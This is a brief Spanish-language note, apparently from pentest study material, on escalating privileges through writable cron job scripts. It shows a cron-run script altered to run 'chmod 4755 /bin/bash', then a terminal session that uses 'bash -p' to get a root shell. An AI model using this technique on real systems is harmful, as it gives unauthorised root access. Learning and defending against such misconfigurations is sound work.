# Detección de tareas cron

- Usaremos un script en bash
Como concepto clave necesitas verificar siempre que los archivos de las tareas cron tengan los permisos apropiados ya que nos podemos aprovechar de esos archivos para volvernos root

* Luego de cambiar el archivo file.sh o el archivo que se este ejutando en las tareas cron
```bash
  [archivo file.sh editado]
  chmod 4755 /bin/bash
```

* Luego podemos lanzar una terminal ya como root
```bash
  [pepito@user Desktop]$ watch -n 1 ls -l /bin/bash
  [pepito@user Desktop]$ bash -p
  bash-5.1# whoami
  root
  bash-5.1#
```
